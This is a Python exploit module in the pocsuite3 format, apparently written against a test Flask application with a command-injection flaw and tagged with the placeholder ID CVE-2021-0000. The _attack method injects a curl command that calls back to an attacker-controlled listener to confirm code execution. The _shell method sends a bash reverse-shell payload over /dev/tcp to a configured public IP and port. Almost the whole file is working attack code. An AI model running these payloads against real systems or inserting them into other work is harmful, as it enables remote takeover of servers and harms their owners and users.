"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
import json
from Framework.Valueconfig import FORMATTIME, ValueStatus
from collections import OrderedDict
import datetime
import random
import string
from urllib.parse import quote, urljoin, urlparse
from Framework.Library.Function.Function.PocSuite.Function import decode_data_input_poc
from Framework.Library.Function.Function.PocSuite.api import POC_SCAN, Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptDict, VUL_TYPE, logger, paths,get_listener_ip, get_listener_port
from Framework.Library.Function.Function.PocSuite.lib.utils import random_str

import requests  # python-requests, eg. apt-get install python3-requests
import sys, os
import re
from configvalue import *

class DemoPOC(POCBase):
    vulID = 'CVE-2021-0000'  # ssvid
    version = '1.0'
    author = ['asdcxsd']
    vulDate = '17/06/2021'
    createDate = '2021/06/17'
    updateDate = '2021/06/17'
    references = ['https://google.com']
    name = 'Flask Server Test - Version < 6.9 - Command injection'
    appPowerLink = {"typescan" : POC_SCAN.EXPLOITS.DIR,
                "language"  : [POC_SCAN.LANGUAGE.PYTHON]}
    appName = 'flask-test-cve-2021-0000'
    appVersion = 'CVE-2021-0000'
    vulType = VUL_TYPE.COMMAND_EXECUTION
    desc = '''Run command code execute from website have vulnerablity'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    pocDesc = '''CVSS: 9.5 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:H/RL:O/RC:C)'''
    url_result = {}
    def _verify(self, update=True):
        if update:
            config_input,  Referer = decode_data_input_poc(self.headers['Referer'])
            try:
                self.url = config_input['Input']['RECON_WEBAPP']
            except Exception as e:
                raise Exception("Error " +  self.appName +   " :" + str(e))
        result = {}
        flag = "Version"
        self.result_url = []
        for url in self.url:
            r = requests.get(url)
            if flag in r.text:
                try:
                    version = r.text
                    version = version.split(flag)[1][:3]
                    self.result_url.append(url)
                except Exception as e: 
                    logger.warn(str(e))
        if len(self.result_url ) > 0:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['url'] = self.result_url
                result['VerifyInfo']['version'] = version
        if update:
            return self.parse_output(result)
        else:
            return result

    def _attack(self):
        config_input,  Referer = decode_data_input_poc(self.headers['Referer'])
        try:
            self.url = config_input['Input']['RECON_WEBAPP']
            host_check_connect = config_input['Config']['Cf_Host_Check_Connect']# http://x.x.x.x:pppp
        except Exception as e:
            raise Exception("Error " +  self.appName +   " :" + str(e))
        self._verify(update=False)
        
        cmd = "run"
        data_attack = []
        host_check = "{}/logrequestbin".format(host_check_connect)
        for url in self.result_url:
            try:
                data_check_connect = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(20))
                data = {
                    "cmd":"curl '{}/requestbin?data={}'".format(host_check_connect, data_check_connect)
                }
                data_request_log = {
                    "data":"{}".format(data_check_connect)
                }
                if not url.endswith('/'): url += "/"
                req = requests.get(url + cmd, params=data, verify=False)
                check = requests.get(host_check,params=data_request_log)
                if check.status_code == 200:
                    data = json.loads(check.text)
                    if data['status'] == ValueStatus.Success:
                        data_attack.append(url)
            except Exception as e:
                print("Error cve-2021-0000", e)
        if len(data_attack) > 0:
            result = {}
            result['ShellInfo'] = {}
            result['ShellInfo']['url'] =  data_attack 
            result['ShellInfo']['info'] = '''flask command injection RCE ''' 
            return self.parse_output(result)
        return self.parse_output(False)

    def _shell(self):
        #getdata input
        result = {}
        result['ShellInfo'] = {
                'Status': 'Success'
            }
        try:
            config_input,  Referer = decode_data_input_poc(self.headers['Referer'])
            try:
                self.url = config_input['Input']['EXPLOIT_POCS']
                lhost_running = config_input['Config']['Cf_PublicIP']
                lport_running = config_input['Config']['Cf_PublicPort']
            except Exception as e:
                raise Exception("Error " +  self.appName +   " :" + str(e))
            #self._verify(update=False)
            self.url = self.url[0]['result']['ShellInfo']['url'][0]
            result['url'] = self.url
            data = {
                "cmd":"/bin/bash -c 'bash -i >&/dev/tcp/{}/{} 0>&1'".format(lhost_running, lport_running)
            }
            req = requests.get(self.url + "run", params=data, verify=False, timeout=3)
            
            return self.parse_output(result)
        except  Exception as e:
            if type(e) == requests.exceptions.ReadTimeout:
                return self.parse_output(result)
            print("Error run shell", self.name, e)
            pass
        return self.parse_output(False)
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
